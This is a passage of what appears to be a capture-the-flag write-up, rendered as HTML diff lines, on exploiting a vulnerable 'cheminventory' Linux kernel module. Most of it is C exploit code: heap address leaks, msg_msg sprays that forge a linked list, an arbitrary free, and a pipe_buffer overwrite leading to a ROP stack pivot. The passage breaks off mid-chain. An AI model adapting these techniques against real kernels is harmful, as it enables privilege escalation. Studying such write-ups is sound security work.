+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(buf2, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(buf2));
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">read_chem</span>(<span style="color:#ae81ff">0</span>, buf, buf2); 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    kheap_three_addr <span style="color:#f92672">=</span> buf[<span style="color:#ae81ff">0</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Fake object 3 address: 0x%llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, kheap_three_addr); 
+</span></span><span style="display:flex;"><span>    vuln_msg <span style="color:#f92672">=</span> buf2[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>; 
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] msg_msg at vulnerable object: 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#66d9ef">int</span>) vuln_msg); 
+</span></span></code></pre></div><p><img src="/images/cheminventory/leak_fake_3.jpg" alt="Leak fake object 3"></p>
+<p>We finally have all the pieces of the puzzle. Now it&rsquo;s time to PWN THE KERNEL!!!</p>
+<h4 id="building-the-fake-linked-list">Building the Fake Linked List</h4>
+<p>We have one leaked address from each of the fake object caches, as well as the address of the target object. All we need to do now is to free the original msg_msgs occupying the objects, and spray new msg_msgs over them which contain the fake list head struct.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Freeing that one specific primary msg_msg</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">msgrcv</span>(msqid[vuln_msg], <span style="color:#f92672">&amp;</span>message, <span style="color:#66d9ef">sizeof</span>(message)<span style="color:#f92672">-</span><span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">long</span>), <span style="color:#ae81ff">0x45</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] Free msg_msg object failed&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Spraying new primary msg_msg</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_MSQIDS; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>message, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(message));
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>message.mtype <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x46</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>message.mtext[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> MSG_TAG;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>message.mtext[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> i;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>message.mtext[<span style="color:#ae81ff">176</span>] <span style="color:#f92672">=</span> kheap_one_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">224</span>; <span style="color:#75715e">// next
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>message.mtext[<span style="color:#ae81ff">184</span>] <span style="color:#f92672">=</span> kheap_one_addr; <span style="color:#75715e">// prev
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>message.mtext[<span style="color:#ae81ff">192</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40</span>; <span style="color:#75715e">// note_size
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>message.mtext[<span style="color:#ae81ff">200</span>] <span style="color:#f92672">=</span> kheap_1024_addr; <span style="color:#75715e">// note_addr
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">msgsnd</span>(msqid[i], <span style="color:#f92672">&amp;</span>message, <span style="color:#66d9ef">sizeof</span>(message) <span style="color:#f92672">-</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">long</span>), <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] msg_msg spray failed&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Freeing fake object 1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">msgrcv</span>(msqid[fake_msg], <span style="color:#f92672">&amp;</span>msg_one, <span style="color:#66d9ef">sizeof</span>(msg_one)<span style="color:#f92672">-</span><span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">long</span>), <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] Free msg_msg object failed&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Spraying new fake object 1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_MSQIDS; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>msg_one, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(msg_one));
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_one.mtype <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x71</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_one.mtext[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> MSG_TAG;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_one.mtext[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> i;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_one.mtext[<span style="color:#ae81ff">168</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>; <span style="color:#75715e">// idx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_one.mtext[<span style="color:#ae81ff">176</span>] <span style="color:#f92672">=</span> kheap_two_addr <span style="color:#f92672">+</span><span style="color:#ae81ff">224</span>; <span style="color:#75715e">// next
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_one.mtext[<span style="color:#ae81ff">184</span>] <span style="color:#f92672">=</span> kheap_three_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">224</span>; <span style="color:#75715e">// prev
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_one.mtext[<span style="color:#ae81ff">192</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_one.mtext[<span style="color:#ae81ff">200</span>] <span style="color:#f92672">=</span> kheap_1024_addr; 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">msgsnd</span>(msqid[i], <span style="color:#f92672">&amp;</span>msg_one, <span style="color:#66d9ef">sizeof</span>(msg_one) <span style="color:#f92672">-</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">long</span>), <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] msg_msg spray failed&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Freeing fake object 2</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">msgrcv</span>(msqid[fake_msg], <span style="color:#f92672">&amp;</span>msg_two, <span style="color:#66d9ef">sizeof</span>(msg_two)<span style="color:#f92672">-</span><span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">long</span>), <span style="color:#ae81ff">0x62</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] Free msg_msg object failed&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Spraying new fake object 2</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_MSQIDS; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>msg_two, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(msg_two));
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_two.mtype <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x72</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_two.mtext[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> MSG_TAG;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_two.mtext[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> i;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_two.mtext[<span style="color:#ae81ff">168</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>; <span style="color:#75715e">// idx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_two.mtext[<span style="color:#ae81ff">176</span>] <span style="color:#f92672">=</span> kheap_three_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">224</span>; <span style="color:#75715e">// next
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_two.mtext[<span style="color:#ae81ff">184</span>] <span style="color:#f92672">=</span> kheap_one_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">224</span>; <span style="color:#75715e">// prev
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_two.mtext[<span style="color:#ae81ff">192</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_two.mtext[<span style="color:#ae81ff">200</span>] <span style="color:#f92672">=</span> kheap_1024_addr; 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">msgsnd</span>(msqid[i], <span style="color:#f92672">&amp;</span>msg_two, <span style="color:#66d9ef">sizeof</span>(msg_two) <span style="color:#f92672">-</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">long</span>), <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] msg_msg spray failed&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Freeing fake object 3</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">msgrcv</span>(msqid[fake_msg], <span style="color:#f92672">&amp;</span>msg_three, <span style="color:#66d9ef">sizeof</span>(msg_three)<span style="color:#f92672">-</span><span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">long</span>), <span style="color:#ae81ff">0x63</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] Free msg_msg object failed&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Spraying new fake object 3</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_MSQIDS; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>msg_three, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(msg_three));
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_three.mtype <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x73</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_three.mtext[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> MSG_TAG;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_three.mtext[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> i;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_three.mtext[<span style="color:#ae81ff">168</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>; <span style="color:#75715e">// idx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_three.mtext[<span style="color:#ae81ff">176</span>] <span style="color:#f92672">=</span> kheap_one_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">224</span>; <span style="color:#75715e">// next
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_three.mtext[<span style="color:#ae81ff">184</span>] <span style="color:#f92672">=</span> kheap_two_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">224</span>; <span style="color:#75715e">// prev
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_three.mtext[<span style="color:#ae81ff">192</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_three.mtext[<span style="color:#ae81ff">200</span>] <span style="color:#f92672">=</span> kheap_1024_addr; 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">msgsnd</span>(msqid[i], <span style="color:#f92672">&amp;</span>msg_three, <span style="color:#66d9ef">sizeof</span>(msg_three) <span style="color:#f92672">-</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">long</span>), <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] msg_msg spray failed&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
+</span></span></code></pre></div><p>We also set up the target object by freeing it and spraying pipe_buffer over it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Freeing secondary msg_msg</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">msgrcv</span>(msqid[fake_msg], <span style="color:#f92672">&amp;</span>msg_secondary, <span style="color:#66d9ef">sizeof</span>(msg_secondary)<span style="color:#f92672">-</span><span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">long</span>), <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] Free msg_msg object failed&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Spraying pipe_buf over freed 1024 area</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_PIPEFDS; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">pipe</span>(pipefd[i]) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] pipe&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">write</span>(pipefd[i][<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#34;ABC&#34;</span>, <span style="color:#ae81ff">3</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] write&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    } 
+</span></span></code></pre></div><p>This is the state of the system at this point of time:</p>
+<p><img src="/images/cheminventory/state_before_free.jpg" alt="State before free"></p>
+<p>Now, we trigger the arbitrary free by freeing the chemical with idx 2.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#a6e22e">free_chem</span>(<span style="color:#ae81ff">2</span>);
+</span></span></code></pre></div><p>Because we have passed all the list protection checks, the kernel module will proceed to free the chemical at idx 2, as well as note_addr, which points to our target object at kmalloc-cg-1k! We are now able to spray something over a freed pipe_buffer object, which was can easily turn into RIP control!</p>
+<h4 id="rop-time">ROP Time!!!</h4>
+<p>All we need to do now is to construct our ROP chain, spray our fake pipe_buffer object to overwrite pipe_buf_operations, and release all the pipe_buffers to ROP!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#a6e22e">save_state</span>();
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(secondary_buf, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(secondary_buf));
+</span></span><span style="display:flex;"><span>    pbuf <span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> pipe_buffer <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>secondary_buf;
+</span></span><span style="display:flex;"><span>    pbuf<span style="color:#f92672">-&gt;</span>ops <span style="color:#f92672">=</span> kheap_1024_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x290</span>;
+</span></span><span style="display:flex;"><span>    ops <span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> pipe_buf_operations <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>secondary_buf[<span style="color:#ae81ff">0x290</span>];
+</span></span><span style="display:flex;"><span>    ops<span style="color:#f92672">-&gt;</span>release <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x556dc6</span>; <span style="color:#75715e">// 0xffffffff81556dc6 : push rsi ; jmp qword ptr [rsi + 0x39]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>rop;
+</span></span><span style="display:flex;"><span>    rop <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>secondary_buf[<span style="color:#ae81ff">0x39</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x135dff</span>; <span style="color:#75715e">// 0xffffffff81135dff : pop rsp ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    
+</span></span><span style="display:flex;"><span>    rop <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>secondary_buf[<span style="color:#ae81ff">0x0</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeefcafebabe</span>;
